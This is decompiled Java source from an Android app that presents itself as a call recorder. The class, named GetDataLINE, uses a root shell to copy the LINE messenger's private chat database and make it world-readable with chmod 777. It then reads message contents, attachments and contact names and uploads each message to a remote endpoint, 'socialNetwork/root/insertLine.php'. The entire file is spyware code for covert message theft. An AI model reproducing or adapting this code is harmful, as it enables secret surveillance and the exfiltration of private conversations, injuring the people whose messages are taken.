package com.yasoka.spcallrecord.recorder.call.a.c.d;

import a.c.e.e;
import a.c.f.a;
import a.c.j.c;
import android.content.Context;
import android.database.Cursor;
import com.crashlytics.android.Crashlytics;
import java.io.DataOutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

/* compiled from: GetDataLINE */
public class g extends h implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f167b;

    /* renamed from: a reason: collision with root package name */
    private final Context f168a;

    public g(Context context) {
        this.f168a = context;
    }

    private void a(Context context, String str, long j) throws Exception {
        SimpleDateFormat d2 = c.d();
        a aVar = new a(context, a.c.e.c.a(), str);
        aVar.b();
        Cursor g = aVar.g("chat_history", j);
        if (g == null) {
            return;
        }
        if (g.getCount() <= 0) {
            a(aVar, g);
            return;
        }
        String str2 = "";
        while (g.moveToNext()) {
            try {
                long j2 = g.getLong(g.getColumnIndexOrThrow("created_time"));
                Date date = new Date();
                date.setTime(j2);
                Date date2 = new Date();
                date2.setTime(e.s(context));
                Calendar instance = Calendar.getInstance();
                instance.setTime(date2);
                instance.add(13, 1);
                if (date.compareTo(instance.getTime()) > 0) {
                    String string = g.getString(g.getColumnIndexOrThrow("content"));
                    if (string == null) {
                        try {
                            string = g.getString(g.getColumnIndexOrThrow("attachement_local_uri"));
                        } catch (Exception e2) {
                            e2.getStackTrace();
                        }
                    }
                    String str3 = string;
                    String string2 = g.getString(g.getColumnIndexOrThrow("from_mid"));
                    if (string2 != null) {
                        Cursor a2 = aVar.a("contacts", "m_id", string2);
                        if (a2 != null && a2.getCount() > 0 && a2.moveToNext()) {
                            str2 = a2.getString(a2.getColumnIndexOrThrow("name"));
                        }
                        a(context, str2, str3, "2", d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertLine.php");
                    } else {
                        a(context, str2, str3, "1", d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertLine.php");
                    }
                    j = date.getTime();
                }
            } catch (Exception e3) {
                e3.getStackTrace();
                try {
                    e3.getStackTrace();
                    Crashlytics.logException(e3);
                } catch (Exception unused) {
                }
            }
        }
        if (j != 0) {
            a.b.a.a.a.a(context.getSharedPreferences("user", 0), "timeline", j);
        }
        a(aVar, g);
    }

    public void run() {
        String str = "LINE.db";
        try {
            Thread.sleep(200);
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
        if (f167b) {
            a(this.f168a);
            return;
        }
        f167b = true;
        try {
            if (e.s(this.f168a) == 0) {
                a.c.e.c.h(this.f168a);
            }
            if (e.s(this.f168a) != 0) {
                long s = e.s(this.f168a);
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/jp.naver.line.android/databases/");
                sb.append("naver_line");
                sb.append(" >  ");
                sb.append(a.c.e.c.a());
                sb.append(str);
                sb.append(" \n");
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(a.c.e.c.a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(a.c.e.c.a());
                sb3.append("\n");
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                a(this.f168a, str, s);
            }
        } catch (Exception e3) {
            e3.getStackTrace();
            try {
                e3.getStackTrace();
                Crashlytics.logException(e3);
            } catch (Exception unused) {
            }
        }
        f167b = false;
        a(this.f168a);
    }
}
